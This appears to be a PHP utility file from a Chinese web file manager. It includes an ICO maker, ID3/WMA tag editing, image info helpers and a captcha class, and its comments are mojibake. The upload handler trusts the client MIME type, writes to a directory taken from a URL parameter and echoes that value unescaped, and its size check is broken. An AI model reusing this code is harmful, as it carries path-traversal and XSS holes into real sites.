        foreach ($gd_image_array as $key => $gd_image) { 
            $icondata .= $BitmapInfoHeader[$key]; 
            $icondata .= $icXOR[$key]; 
            $icondata .= $icAND[$key]; 
        } 
        return $icondata; 
    } 
    function LittleEndian2String($number, $minbytes=1) { 
        $intstring = ''; 
        while ($number > 0) { 
            $intstring = $intstring.chr($number & 255); 
            $number >>= 8; 
        } 
        return str_pad($intstring, $minbytes, "\x00", STR_PAD_RIGHT); 
    } 
    function GetPixelColor(&$img, $x, $y) { 
        if (!is_resource($img)) { 
            return false; 
        } 
        return @ImageColorsForIndex($img, @ImageColorAt($img, $x, $y)); 
    } 
} 


//��ͼ����
if($ico=="yes"){
$output = "";  
if(isset($_GET['action'])&&$_GET['action'] == 'make'){  
    if(isset($_FILES['upimage']['tmp_name']) && $_FILES['upimage']['tmp_name'] && is_uploaded_file($_FILES['upimage']['tmp_name'])){  
        if($_FILES['upimage']['type']>210000){  
            echo "���ϴ����ļ�������������� ����ܳ���200K";  
            exit();  
        }  
        $fileext = array("image/jpeg","image/gif","image/x-png","image/png");  
        if(!in_array($_FILES['upimage']['type'],$fileext)){  
            echo $_FILES['upimage']['type']."���ϴ����ļ���ʽ����ȷ ��֧�� jpg��gif��png <a href='?ico=yes&action=make&dir=".$dir."'>����</a>";  
            exit();  
        }  
        if($im = @imagecreatefrompng($_FILES['upimage']['tmp_name']) or $im = @imagecreatefromgif($_FILES['upimage']['tmp_name']) or $im = @imagecreatefromjpeg($_FILES['upimage']['tmp_name'])){  
            $imginfo = @getimagesize($_FILES['upimage']['tmp_name']);  
            if(!is_array($imginfo)){  
                echo "ͼ�θ�ʽ����";  
            }  
            switch($_POST['size']){  
                case 1;  
                    $resize_im = @imagecreatetruecolor(16,16);  
                    $size = 16;  
                    break;  
                case 2;  
                    $resize_im = @imagecreatetruecolor(32,32);  
                    $size = 32;  
                    break;  
                case 3;  
                    $resize_im = @imagecreatetruecolor(48,48);  
                    $size = 48;  
                    break;  
                default;  
                    $resize_im = @imagecreatetruecolor(32,32);  
                    $size = 32;  
                    break;  
            }  

            imagecopyresampled($resize_im,$im,0,0,0,0,$size,$size,$imginfo[0],$imginfo[1]);  

            $icon = new phpthumb_ico();  
            $gd_image_array = array($resize_im);  
            $icon_data = $icon->GD2ICOstring($gd_image_array);  
            $filename = $dir."/".date("Ymdhis").rand(1,1000).".ico";  
            if(file_put_contents($filename, $icon_data)){  
                $output = "<a href=\"".$filename."\" target=\"_blank\"><img src=\"".$filename."\" height=\"30\" width=\"30\"></a>";  
            }  
        }else{  
            echo "���ɴ��������ԣ�";  
        }  
    }      
}
?>
<script>
function ico(){
$dir=parent.$$('ML').value
document.getElementById('NEWico').action="?ico=yes&action=make&dir="+$dir;
document.getElementById('NEWico').submit();	
}
</script>
	<form action="?ico=yes&action=make" method="post" enctype='multipart/form-data' id="NEWico">  
		<table width="99%" align="center">  
			<tr>  
			  <td height="40" colspan="2"><input type="file" name="upimage" size="30"><br>
				�ߴ�:<input type="radio" name="size" value="1" id="s1"><label for="s1">16*16</label>  
				<input type="radio" name="size" value="2" id="s2" checked><label for="s2">32*32</label>  
				<input type="radio" name="size" value="3" id="s3"><label for="s3">48*48</label>  
			  </td>  
			</tr>  
			  
			<tr>  
			  <td height="40" align="center"><input type="button" style="width:160px; height:30px;" value="��������icoͼ�굽��Ŀ¼" onclick="ico();"></td> 
                          <td height="40">
			<?PHP  
			if($output){  
				echo $output;  
?><script>
parent.$$('ajaxurl').src="?iframeA=1&dir=<?=$dir?>";
</script><?
			}
			?>  
                          </td>  
			</tr>
		</table>  
		</form>

<?
die();
}
//-------ID3 ��д��-------------------------
class AudioExif
{
	// public vars
	var $_wma = false;
	var $_mp3 = false;
	var $_cs = 'GBK';

	// Construct
	function AudioExif($cs = '')
	{
		// nothing to do
		if ($cs != '') $this->_cs = $cs;
	}

	// check the filesize
	function CheckSize($file)
	{
		$handler = &$this->_get_handler($file);
		if (!$handler) return false;
		return $handler->check_size($file);
	}

	// get the infomations
	function GetInfo($file)
	{
		$handler = &$this->_get_handler($file);
		if (!$handler) return false;
		return $handler->get_info($file, $this->_cs);
	}

	// write the infomations
	function SetInfo($file, $pa)
	{
		if (!is_writable($file))
		{
			trigger_error('AudioExif: file `' . $file . '` can not been overwritten', E_USER_WARNING);
			return false;
		}
		$handler = &$this->_get_handler($file);
		if (!$handler) return false;
		return $handler->set_info($file, $pa, $this->_cs);
	}

	// private methods
	function &_get_handler($file)
	{
		$ext = strtolower(strrchr($file, '.'));
		$ret = false;
		if ($ext == '.mp3')
		{	// MP3
			$ret = &$this->_mp3;
			if (!$ret) $ret = new _Mp3Exif();
		}
		else if ($ext == '.wma')
		{	// wma
			$ret = &$this->_wma;
			if (!$ret) $ret = new _WmaExif();
		}
		else
		{	// unknown
			trigger_error('AudioExif not supported `' . $ext . '` file.', E_USER_WARNING);
		}
		return $ret;
	}
}

// DBCS => gb2312
function _ae_from_dbcs($str, $cs)
{
	// strip the last "\0\0"
	if (substr($str, -2, 2) == "\0\0") $str = substr($str, 0, -2);
	return mb_convert_encoding($str, $cs, 'UCS-2LE');
}

// gb2312 => DBCS
function _ae_to_dbcs($str, $cs)
{
	$str  = mb_convert_encoding($str, 'UCS-2LE', $cs);
	$str .= "\0\0";
	return $str;
}

// file exif
class _AudioExif
{
	var $fd;
	var $head;
	var $head_off;
	var $head_buf;
	
	// init the file handler
	function _file_init($fpath, $write = false)
	{
		$mode = ($write ? 'rb+' : 'rb');
		$this->fd = @fopen($fpath, $mode);
		if (!$this->fd)
		{
			trigger_error('AudioExif: `' . $fpath . '` can not be opened with mode `' . $mode . '`', E_USER_WARNING);
			return false;
		}
		$this->head = false;
		$this->head_off = 0;
		$this->head_buf = '';
		return true;
	}

	// read buffer from the head_buf & move the off pointer
	function _read_head_buf($len)
	{
		if ($len <= 0) return NULL;
		$buf = substr($this->head_buf, $this->head_off, $len);
		$this->head_off += strlen($buf);
		return $buf;
	}

	// read one short value
	function _read_head_short()
	{
		$ord1 = ord(substr($this->head_buf, $this->head_off, 1));
		$ord2 = ord(substr($this->head_buf, $this->head_off+1, 1));
		$this->head_off += 2;
		return ($ord1 + ($ord2<<8));
	}

	// save the file head
	function _file_save($head, $olen, $nlen = 0)
	{
		if ($nlen == 0) $nlen = strlen($head);
		if ($nlen == $olen)
		{
			// shorter
			flock($this->fd, LOCK_EX);
			fseek($this->fd, 0, SEEK_SET);
			fwrite($this->fd, $head, $nlen);
			flock($this->fd, LOCK_UN);
		}
		else
		{
			// longer, buffer required
			$stat = fstat($this->fd);
			$fsize = $stat['size'];

			// buf required (4096?) Ӧ�ò��� nlen - olen > 4096 ��
			$woff = 0;
			$roff = $olen;

			// read first buffer
			flock($this->fd, LOCK_EX);
			fseek($this->fd, $roff, SEEK_SET);
			$buf = fread($this->fd, 4096);

			// seek to start
			fseek($this->fd, $woff, SEEK_SET);
			fwrite($this->fd, $head, $nlen);
			$woff += $nlen;

			// seek to woff & write the data
			do
			{
				$buf2 = $buf;
				$roff += 4096;
				if ($roff < $fsize) 
				{
					fseek($this->fd, $roff, SEEK_SET);
					$buf = fread($this->fd, 4096);					
				}

				// save last buffer
				$len2 = strlen($buf2);
				fseek($this->fd, $woff, SEEK_SET);
				fwrite($this->fd, $buf2, $len2);
				$woff += $len2;
			}
			while ($roff < $fsize);
			ftruncate($this->fd, $woff);
			flock($this->fd, LOCK_UN);
		}
	}

	// close the file
	function _file_deinit()
	{
		if ($this->fd)
		{
			fclose($this->fd);
			$this->fd = false;
		}		
	}
}

// wma class
class _WmaExif extends _AudioExif
{
	var $items1 = array('Title', 'Artist', 'Copyright', 'Description', 'Reserved');
	var $items2 = array('Year', 'Genre', 'AlbumTitle');

	// check file size (length) maybe invalid file
	function check_size($file)
	{
		$ret = false;
		if (!$this->_file_init($file)) return true;
		if ($this->_init_header())
		{
			$buf = fread($this->fd, 24);
			$tmp = unpack('H32id/Vlen/H8unused', $buf);	
			if ($tmp['id'] == '3626b2758e66cf11a6d900aa0062ce6c')
			{
				$stat = fstat($this->fd);
				$ret = ($stat['size'] == ($this->head['len'] + $tmp['len']));
			}
		}
		$this->_file_deinit();
		return $ret;
	}

	// set info (save the infos)
	function set_info($file, $pa, $cs)
	{
		// check the pa
		settype($pa, 'array');
		if (!$this->_file_init($file, true)) return false;
		if (!$this->_init_header())
		{
			$this->_file_deinit();
			return false;
		}
		
		// parse the old header & generate the new header
		$head_body = '';
		$st_found = $ex_found = false;
		$head_num = $this->head['num'];
		while (($tmp = $this->_get_head_frame()) && ($head_num > 0))
		{
			$head_num--;
			if ($tmp['id'] == '3326b2758e66cf11a6d900aa0062ce6c')
			{	// Standard Info
				// 1-4
				$st_found = true;
				$st_body1 = $st_body2 = '';				
				$lenx = unpack('v5', $this->_read_head_buf(10));
				$tmp['len'] -= 34;	// 10 + 24
				for ($i = 0; $i < count($this->items1); $i++)
				{
					$l = $lenx[$i+1];
					$k = $this->items1[$i];
					$tmp['len'] -= $l;

					$data = $this->_read_head_buf($l);
					if (isset($pa[$k])) $data = _ae_to_dbcs($pa[$k], $cs);

					$st_body2 .= $data;
					$st_body1 .= pack('v', strlen($data));
				}
				// left length
				if ($tmp['len'] > 0) $st_body2 .= $this->_read_head_buf($tmp['len']);

				// save to head_body
				$head_body .= pack('H32VH8', $tmp['id'], strlen($st_body1 . $st_body2)+24, $tmp['unused']);
				$head_body .= $st_body1 . $st_body2;		
			}
			else if ($tmp['id'] == '40a4d0d207e3d21197f000a0c95ea850')
			{	// extended info
				$ex_found = true;
				
				$inum = $this->_read_head_short();
				$inum2 = $inum;
				$tmp['len'] -= 26;	// 24 + 2
				$et_body = '';
				while ($tmp['len'] > 0 && $inum > 0)
				{
					// attribute name
					$nlen = $this->_read_head_short();
					$nbuf = $this->_read_head_buf($nlen);

					// the flag & value  length
					$flag = $this->_read_head_short();
					$vlen = $this->_read_head_short();
					$vbuf = $this->_read_head_buf($vlen);

					// set the length
					$tmp['len'] -= (6 + $nlen + $vlen);
					$inum--;

					// save the data?
					$name = _ae_from_dbcs($nbuf, $cs);
					$k = substr($name, 3);
					if (in_array($k, $this->items2) && isset($pa[$k]))
					{
						$vbuf = _ae_to_dbcs($pa[$k], $cs);
						$vlen = strlen($vbuf);
						unset($pa[$k]);
					}
					$et_body .= pack('v', $nlen) . $nbuf . pack('vv', $flag, $vlen) . $vbuf;
				}
				// new tag insert??
				foreach ($this->items2 as $k)
				{
					if (isset($pa[$k]))
					{
						$inum2++;
						$nbuf = _ae_to_dbcs('WM/' . $k, $cs);
						$nlen = strlen($nbuf);
						$vbuf = _ae_to_dbcs($pa[$k], $cs);
						$vlen = strlen($vbuf);
						$et_body .= pack('v', $nlen) . $nbuf . pack('vv', 0, $vlen) . $vbuf;
					}
				}
				// left buf?
				if ($tmp['len'] > 0) $et_body .= $this->_read_head_buf($tmp['len']);

				// save to head_body
				$head_body .= pack('H32VH8v', $tmp['id'], strlen($et_body)+26, $tmp['unused'], $inum2);
				$head_body .= $et_body;		
			}
			else
			{
				// just keep other head frame
				$head_body .= pack('H32VH8', $tmp['id'], $tmp['len'], $tmp['unused']);
				if ($tmp['len'] > 24) $head_body .= $this->_read_head_buf($tmp['len']-24);
			}
		}

		// st not found?
		if (!$st_found)
		{
			$st_body1 = $st_body2 = '';
			foreach ($this->items1 as $k)
			{
				$data = (isset($pa[$k]) ? _ae_to_dbcs($pa[$k], $cs) : "");
				$st_body1 .= pack('v', strlen($data));
				$st_body2 .= $data;
			}
			
			// save to head_body
			$head_body .= pack('H32Va4', '3326b2758e66cf11a6d900aa0062ce6c', strlen($st_body1 . $st_body2)+24, '');
			$head_body .= $st_body1 . $st_body2;
			$this->head['num']++;
		}
		// ex not found?
		if (!$ex_found)
		{
			$inum = 0;
			$et_body = '';
			foreach ($this->items2 as $k)
			{
				$nbuf = _ae_to_dbcs('WM/' . $k);
				$vbuf = (isset($pa[$k]) ? _ae_to_dbcs($pa[$k], $cs) : "");
				$et_body .= pack('v', strlen($nbuf)) . $nbuf . pack('vv', 0, strlen($vbuf)) . $vbuf;
				$inum++;
			}
			$head_body .= pack('H32Va4v', '40a4d0d207e3d21197f000a0c95ea850', strlen($et_body)+26, '', $inum);
			$head_body .= $et_body;
			$this->head['num']++;
		}		

		// after save
		$new_len = strlen($head_body) + 30;
		$old_len = $this->head['len'];
		if ($new_len < $old_len)
		{
			$head_body .= str_repeat("\0", $old_len - $new_len);
			$new_len = $old_len;
		}
		$tmp = $this->head;
		$head_buf = pack('H32VVVH4', $tmp['id'], $new_len, $tmp['len2'], $tmp['num'], $tmp['unused']);
		$head_buf .= $head_body;
		$this->_file_save($head_buf, $old_len, $new_len);

		// close the file & return
		$this->_file_deinit();
		return true;
	}

	// get info
	function get_info($file, $cs)
	{
		$ret = array();
		if (!$this->_file_init($file)) return false;
		if (!$this->_init_header())
		{
			$this->_file_deinit();
			return false;
		}

		// get the data from head_buf
		$head_num = $this->head['num'];	// num of head_frame
		while (($tmp = $this->_get_head_frame()) && $head_num > 0)
		{
			$head_num--;
			if ($tmp['id'] == '3326b2758e66cf11a6d900aa0062ce6c')
			{	// Standard Info
				$lenx = unpack('v*', $this->_read_head_buf(10));
				for ($i = 1; $i <= count($this->items1); $i++)
				{
					$k = $this->items1[$i-1];
					$ret[$k] = _ae_from_dbcs($this->_read_head_buf($lenx[$i]), $cs);
				}
			}
			else if ($tmp['id'] == '40a4d0d207e3d21197f000a0c95ea850')
			{	// Extended Info
				$inum = $this->_read_head_short();
				$tmp['len'] -= 26;
				while ($inum > 0 && $tmp['len'] > 0)
				{
					// attribute name
					$nlen = $this->_read_head_short();
					$nbuf = $this->_read_head_buf($nlen);

					// the flag & value  length
					$flag = $this->_read_head_short();
					$vlen = $this->_read_head_short();
					$vbuf = $this->_read_head_buf($vlen);

					// update the XX
					$tmp['len'] -= (6 + $nlen + $vlen);
					$inum--;

					$name = _ae_from_dbcs($nbuf, $cs);
					$k = substr($name, 3);
					if (in_array($k, $this->items2))
					{	// all is string value (refer to falg for other tags)
						$ret[$k] = _ae_from_dbcs($vbuf, $cs);
					}
				}		
			}
			else
			{	// skip only
				if ($tmp['len'] > 24) $this->head_off += ($tmp['len'] - 24);
			}
		}
		$this->_file_deinit();
		return $ret;
	}

	// get the header?
	function _init_header()
	{
		fseek($this->fd, 0, SEEK_SET);
		$buf = fread($this->fd, 30);
		if (strlen($buf) != 30) return false;
		$tmp = unpack('H32id/Vlen/Vlen2/Vnum/H4unused', $buf);
		if ($tmp['id'] != '3026b2758e66cf11a6d900aa0062ce6c')
			return false;

		$this->head_buf = fread($this->fd, $tmp['len'] - 30);
		$this->head = $tmp;
		return true;
	}

	// _get_head_frame()
	function _get_head_frame()
	{
		$buf = $this->_read_head_buf(24);		
		if (strlen($buf) != 24) return false;
		$tmp = unpack('H32id/Vlen/H8unused', $buf);
		return $tmp;
	}
}

// mp3 class (if not IDv2 then select IDv1)
class _Mp3Exif extends _AudioExif
{
	var $head1;
	var $genres = array('Blues','Classic Rock','Country','Dance','Disco','Funk','Grunge','Hip-Hop','Jazz','Metal','New Age','Oldies','Other','Pop','R&B','Rap','Reggae','Rock','Techno','Industrial','Alternative','Ska','Death Metal','Pranks','Soundtrack','Euro-Techno','Ambient','Trip-Hop','Vocal','Jazz+Funk','Fusion','Trance','Classical','Instrumental','Acid','House','Game','Sound Clip','Gospel','Noise','AlternRock','Bass','Soul','Punk','Space','Meditative','Instrumental Pop','Instrumental Rock','Ethnic','Gothic','Darkwave','Techno-Industrial','Electronic','Pop-Folk','Eurodance','Dream','Southern Rock','Comedy','Cult','Gangsta','Top 40','Christian Rap','Pop/Funk','Jungle','Native American','Cabaret','New Wave','Psychadelic','Rave','Showtunes','Trailer','Lo-Fi','Tribal','Acid Punk','Acid Jazz','Polka','Retro','Musical','Rock & Roll','Hard Rock','Unknown');

	// MP3 always return true
	function check_size($file)
	{
		return true;
	}

	// get info
	function get_info($file, $cs)
	{
		if (!$this->_file_init($file)) return false;		
		$ret = false;
		if ($this->_init_header())
		{
			$ret = ($this->head ? $this->_get_v2_info($cs) : $this->_get_v1_info());
			$ret['meta'] = $this->_get_meta_info();
		}
		$this->_file_deinit();
		return $ret;
	}

	// set info
	function set_info($file, $pa, $cs)
	{
		if (!$this->_file_init($file, true)) return false;
		if ($this->_init_header())
		{
			// always save v1 info
			$this->_set_v1_info($pa);			
			// set v2 first if need
			$this->_set_v2_info($pa, $cs);
		}
		$this->_file_deinit();
		return true;
	}

	// get the header information[v1+v2], call after file_init
	function _init_header()
	{
		$this->head1 = false;
		$this->head = false;

		// try to get ID3v1 first
		fseek($this->fd, -128, SEEK_END);
		$buf = fread($this->fd, 128);
		if (strlen($buf) == 128 && substr($buf, 0, 3) == 'TAG')
		{
			$tmp = unpack('a3id/a30Title/a30Artist/a30AlbumTitle/a4Year/a28Description/CReserved/CTrack/CGenre', $buf);
			$this->head1 = $tmp;			
		}

		// try to get ID3v2
		fseek($this->fd, 0, SEEK_SET);
		$buf = fread($this->fd, 10);
		if (strlen($buf) == 10 && substr($buf, 0, 3) == 'ID3') 
		{
			$tmp = unpack('a3id/Cver/Crev/Cflag/C4size', $buf);
			$tmp['size'] = ($tmp['size1']<<21)|($tmp['size2']<<14)|($tmp['size3']<<7)|$tmp['size4'];
			unset($tmp['size1'], $tmp['size2'], $tmp['size3'], $tmp['size4']);

			$this->head = $tmp;
			$this->head_buf = fread($this->fd, $tmp['size']);
		}
		return ($this->head1 || $this->head);
	}

	// get v1 info
	function _get_v1_info()
	{
		$ret = array();
		$tmpa = array('Title', 'Artist', 'Copyright', 'Description', 'Year', 'AlbumTitle');
		foreach ($tmpa as $tmp)
		{			
			$ret[$tmp] = $this->head1[$tmp];
			if ($pos = strpos($ret[$tmp], "\0")) 
				$ret[$tmp] = substr($ret[$tmp], 0, $pos);
		}

		// count the Genre, [Track]
		if ($this->head1['Reserved'] == 0) $ret['Track'] = $this->head1['Track'];
		else $ret['Description'] .= chr($ret['Reserved']) . chr($ret['Track']);

		// Genre_idx
		$g = $this->head1['Genre'];
		if (!isset($this->genres[$g])) $ret['Genre'] = 'Unknown';
		else $ret['Genre'] = $this->genres[$g];

		// return the value
		$ret['ID3v1'] = 'yes';
		return $ret;
	}

	// get v2 info
	function _get_v2_info($cs)
	{
		$ret = array();
		$items = array(	'TCOP'=>'Copyright', 'TPE1'=>'Artist', 'TIT2'=>'Title', 'TRCK'=> 'Track',
						'TCON'=>'Genre', 'COMM'=>'Description', 'TYER'=>'Year', 'TALB'=>'AlbumTitle');
		while (true)
		{
			$buf = $this->_read_head_buf(10);
			if (strlen($buf) != 10) break;			
			$tmp = unpack('a4fid/Nsize/nflag', $buf);
			if ($tmp['size'] == 0) break;
			$tmp['dat'] = $this->_read_head_buf($tmp['size']);

			// 0x6000 (11000000 00000000)		
			if ($tmp['flag'] & 0x6000) continue;			

			// mapping the data
			if ($k = $items[$tmp['fid']])
			{	// If first char is "\0", just skip
				$char = ord(substr($tmp['dat'], 0, 1));
				if ($char == 0) $ret[$k] = substr($tmp['dat'], 1);	// iso-8859-1
				else if ($char == 1) 									// ucs-2, utf-16 with bom
				{
					if (substr($tmp['dat'], 1, 2) === "\xfe\xff") 
						$ret[$k] = mb_convert_encoding(substr($tmp['dat'], 3), $cs, 'UTF-16BE');
					else if (substr($tmp['dat'], 1, 2) === "\xff\xfe")
						$ret[$k] = mb_convert_encoding(substr($tmp['dat'], 3), $cs, 'UTF-16LE');
					else
						$ret[$k] = mb_convert_encoding(substr($tmp['dat'], 1), $cs, 'UCS-2');					
				}
				else if ($char == 2)									// utf8-16be without bom
					$ret[$k] = mb_convert_encoding(substr($tmp['dat'], 1), $cs, 'UTF-16BE');
				else if ($char == 3)									// utf-8
					$ret[$k] = mb_convert_encoding(substr($tmp['dat'], 1), $cs, 'UTF-8');
				else
					$ret[$k] = $tmp['dat'];
			}
		}

		// reset the genre
		if ($g = $ret['Genre'])
		{
			if (substr($g,0,1) == '(' && substr($g,-1,1) == ')') $g = substr($g, 1, -1);
			if (is_numeric($g))
			{
				$g = intval($g);
				$ret['Genre'] = (isset($this->genres[$g]) ? $this->genres[$g] : 'Unknown');
			}
		}

		$ret['ID3v1'] = 'no';
		return $ret;
	}

	// get meta info of MP3
	function _get_meta_info()
	{
		// seek to the lead buf: 0xff
		$off = 0;
		if ($this->head) $off = $this->head['size'] + 10;
		fseek($this->fd, $off, SEEK_SET);
		while (!feof($this->fd))
		{
			$skip = ord(fread($this->fd, 1));
			if ($skip == 0xff) break;
		}
		if ($skip != 0xff) return false;
		$buf = fread($this->fd, 3);
		if (strlen($buf) != 3) return false;
		$tmp = unpack('C3', $buf);
		if (($tmp[1] & 0xf0) != 0xf0) return false;

		// get the meta info
		$meta = array();

		// get mpeg version
		$meta['mpeg']	= ($tmp[1] & 0x08 ? 1 : 2);
		$meta['layer']	= ($tmp[1] & 0x04) ? (($tmp[1] & 0x02) ? 1 : 2) : (($tmp[1] & 0x02) ? 3 : 0);
		$meta['epro']	= ($tmp[1] & 0x01) ? 'no' : 'yes';

		// bit rates
		$bit_rates = array(
			1 => array(
				1 => array(0,32,64,96,128,160,192,224,256,288,320,352,384,416,448,0),
				2 => array(0,32,48,56,64,80,96,112,128,160,192,224,256,320,384,0),
				3 => array(0,32,40,48,56,64,80,96,112,128,160,192,224,256,320,0)
			),
			2 => array(
				1 => array(0,32,48,56,64,80,96,112,128,144,160,176,192,224,256,0),
				2 => array(0,8,16,24,32,40,48,56,64,80,96,112,128,144,160,0),
				3 => array(0,8,16,24,32,40,48,56,64,80,96,112,128,144,160,0)
			)
		);
		$i = $meta['mpeg'];
		$j = $meta['layer'];
		$k = ($tmp[2]>>4);
		$meta['bitrate'] = $bit_rates[$i][$j][$k];

		// sample rates <������>
		$sam_rates = array(1=>array(44100,48000,32000,0), 2=>array(22050,24000,16000,0));
		$meta['samrate'] = $sam_rates[$i][$k];
		$meta["padding"] = ($tmp[2] & 0x02) ? 'on' : 'off';
		$meta["private"] = ($tmp[2] & 0x01) ? 'on' : 'off';

		// mode & mode_ext
		$k = ($tmp[3]>>6);
		$channel_modes = array('stereo', 'joint stereo', 'dual channel', 'single channel');
		$meta['mode'] = $channel_modes[$k];

		$k = (($tmp[3]>>4) & 0x03);
		$extend_modes = array('MPG_MD_LR_LR', 'MPG_MD_LR_I', 'MPG_MD_MS_LR', 'MPG_MD_MS_I');
		$meta['ext_mode'] = $extend_modes[$k];

		$meta['copyright'] = ($tmp[3] & 0x08) ? 'yes' : 'no';
		$meta['original'] = ($tmp[3] & 0x04) ? 'yes' : 'no';

		$emphasis = array('none', '50/15 microsecs', 'rreserved', 'CCITT J 17');
		$k = ($tmp[3] & 0x03);
		$meta['emphasis'] = $emphasis[$k];

		return $meta;
	}

	// set v1 info
	function _set_v1_info($pa)
	{
		// ID3v1 (simpled)
		$off = -128;
		if (!($tmp = $this->head1))
		{			
			$off = 0;
			$tmp['id'] = 'TAG';
			$tmp['Title'] = $tmp['Artist'] = $tmp['AlbumTitle'] = $tmp['Year'] = $tmp['Description'] = '';
			$tmp['Reserved'] = $tmp['Track'] = $tmp['Genre'] = 0;
		}
		
		// basic items
		$items = array('Title', 'Artist', 'Copyright', 'Description', 'Year', 'AlbumTitle');
		foreach ($items as $k)
		{
			if (isset($pa[$k])) $tmp[$k] = $pa[$k];
		}

		// genre index
		if (isset($pa['Genre']))
		{
			$g = 0;
			foreach ($this->genres as $gtmp)
			{
				if (!strcasecmp($gtmp, $pa['Genre'])) 
					break;
				$g++;
			}
			$tmp['Genre'] = $g;
		}
		if (isset($pa['Track'])) $tmp['Track'] = intval($pa['Track']);

		// pack the data
		$buf = pack('a3a30a30a30a4a28CCC',	$tmp['id'], $tmp['Title'], $tmp['Artist'], $tmp['AlbumTitle'],
						$tmp['Year'], $tmp['Description'], 0, $tmp['Track'], $tmp['Genre']);

		flock($this->fd, LOCK_EX);
		fseek($this->fd, $off, SEEK_END);
		fwrite($this->fd, $buf, 128);
		flock($this->fd, LOCK_UN);
	}

	// set v2 info
	function _set_v2_info($pa, $cs)
	{
		if (!$this->head)
		{	// insert ID3
			return;	// û�о�����
			/**
			$tmp = array('id'=>'ID3','ver'=>3,'rev'=>0,'flag'=>0);
			$tmp['size'] = -10;	// +10 => 0
			$this->head = $tmp;
			$this->head_buf = '';
			$this->head_off = 0;
			**/
		}
		$items = array(	'TCOP'=>'Copyright', 'TPE1'=>'Artist', 'TIT2'=>'Title', 'TRAC'=>'Track',
						'TCON'=>'Genre', 'COMM'=>'Description', 'TYER'=>'Year', 'TALB'=>'AlbumTitle');

		$head_body = '';
		while (true)
		{
			$buf = $this->_read_head_buf(10);
			if (strlen($buf) != 10) break;
			$tmp = unpack('a4fid/Nsize/nflag', $buf);
			if ($tmp['size'] == 0) break;
			$data = $this->_read_head_buf($tmp['size']);

			if (($k = $items[$tmp['fid']]) && isset($pa[$k]))
			{
				// the data should prefix by "\0" [replace]
				if (preg_match('/[\x80-\xff]/', $pa[$k]))
					$data = "\1" . mb_convert_encoding($pa[$k], 'UCS-2', $cs);
				else
					$data = "\0" . $pa[$k];
				unset($pa[$k]);
			}
			$head_body .= pack('a4Nn', $tmp['fid'], strlen($data), $tmp['flag']) . $data;
		}
		// reverse the items & set the new tags
		$items = array_flip($items);
		foreach ($pa as $k => $v)
		{
			if ($fid = $items[$k])
			{
				$head_body .= pack('a4Nn', $fid, strlen($v) + 1, 0) . "\0" . $v;
			}
		}

		// new length
		$new_len = strlen($head_body) + 10;
		$old_len = $this->head['size'] + 10;
		if ($new_len < $old_len)
		{
			$head_body .= str_repeat("\0", $old_len - $new_len);
			$new_len = $old_len;			
		}

		// count the size1,2,3,4, no include the header
		// ��Ϊ��̬���㷨... :p (28bytes integer)
		$size = array();
		$nlen = $new_len - 10;
		for ($i = 4; $i > 0; $i--)
		{
			$size[$i] = ($nlen & 0x7f);
			$nlen >>= 7;
		}
		$tmp = $this->head;
		//echo "old_len : $old_len new_len: $new_len\n";
		$head_buf = pack('a3CCCCCCC', $tmp['id'], $tmp['ver'], $tmp['rev'], $tmp['flag'],
			$size[1], $size[2], $size[3], $size[4]);
		$head_buf .= $head_body;
		$this->_file_save($head_buf, $old_len, $new_len);
	}
}
//--------excelԤ����-----------------------

//--------���ͼ�������Ϣ-------------------
function getimageinfo($img) { //$imgΪͼ���ļ�����·�� 
$img_info = @getimagesize($img); 
switch ($img_info[2]) { 
case 1: 
$imgtype = "GIF"; 
break; 
case 2: 
$imgtype = "JPG"; 
break; 
case 3: 
$imgtype = "PNG"; 
break; 
case 4: 
$imgtype = "SWC"; 
break; 
case 5: 
$imgtype = "psd"; 
break; 
case 6: 
$imgtype = "bmp"; 
break;
case 7: 
$imgtype = "TIFF"; 
break;  
case 8: 
$imgtype = "TIFF"; 
break; 
case 9: 
$imgtype = "JPC"; 
break; 
case 10: 
$imgtype = "JP2"; 
break; 
case 11: 
$imgtype = "JPX"; 
break; 
case 12: 
$imgtype = "JB2"; 
break; 
case 13: 
$imgtype = "FLASH"; 
break; 
case 14: 
$imgtype = "IFF"; 
break; 
case 15: 
$imgtype = "WBMP"; 
break; 
case 16: 
$imgtype = "XBM"; 
break; 
} 
$img_type = $imgtype."ͼ��"; 
$img_size = ceil(filesize($img)/1000)."k"; //��ȡ�ļ���С 

$new_img_info = array ( 
"width"=>$img_info[0], 
"height"=>$img_info[1], 
"type"=>$img_type, 
"size"=>$img_size 
); 
return $new_img_info; 
}   
//--------��麯��״��-----------------------
	function getfun($funName) {
		return (false !== function_exists($funName)) ? Yes : No;
	}
// ���PHP���ò���
	function getphpcfg($varname) {
		switch($result = get_cfg_var($varname)) {
			case 0:
			return No;
			break;
			case 1:
			return Yes;
			break;
			default:
			return $result;
			break;
		}
	}
//------�ֽڸ�ʽ��--------------------------
function byte_format($size,$dec=2){
    $size= ereg_replace("-","",$size); 
    $a = array("&nbsp;B", "KB", "MB", "GB", "TB", "PB","EB","ZB","YB");
    $pos = 0;
    while ($size >= 1024)   
    {
        $size /= 1024;
        $pos++;
    }
    return round($size,$dec)." ".$a[$pos];
}
//-------��֤��-------------------------------
class ValidationCode
{
private $width,$height,$codenum;
public $checkcode;     //��������֤��
private $checkimage;    //��֤��ͼƬ 
private $disturbColor = ''; //��������
/*
* �����������ȣ��߶ȣ��ַ�������
*/
function __construct($width='80',$height='20',$codenum='4',$nua='0')
{
   $this->width=$width;
   $this->height=$height;
   $this->codenum=$codenum;
   $this->nua=$nua;
}

function random($length, $numeric = 0) {
        PHP_VERSION < '4.2.0' ? mt_srand ( ( double ) microtime () * 1000000 ) : mt_srand ();
        $seed = base_convert ( md5 ( print_r ( $_SERVER, 1 ) . microtime () ), 16, $numeric ? 10 : 35 );
        $seed = $numeric ? (str_replace ( '0', '', $seed ) . '012340567890') : ($seed . 'zZ' . strtoupper ( $seed ));
        $hash = '';
        $max = strlen ( $seed ) - 1;
        for($i = 0; $i < $length; $i ++) {
                $hash .= $seed [mt_rand ( 0, $max )];
        }
        return $hash;
}

function outImg()
{
   //���ͷ
   $this->outFileHeader();
   //������֤��
   $this->createCode();

   //����ͼƬ
   $this->createImage();
   //���ø�������
   $this->setDisturbColor();
   //��ͼƬ��д��֤��
   $this->writeCheckCodeToImage();
   imagepng($this->checkimage);
   imagedestroy($this->checkimage);
}
/*
   * @brief ���ͷ
   */
private function outFileHeader()
{
   header ("Content-type: image/png");
}
/**
   * ������֤��
   */
private function createCode()
{
   $this->checkcode = $this->random($this->codenum,$this->nua);
}
/**
   * ������֤��ͼƬ
   */
private function createImage()
{
   $this->checkimage = @imagecreate($this->width,$this->height);
   $back = imagecolorallocate($this->checkimage,255,255,255); 
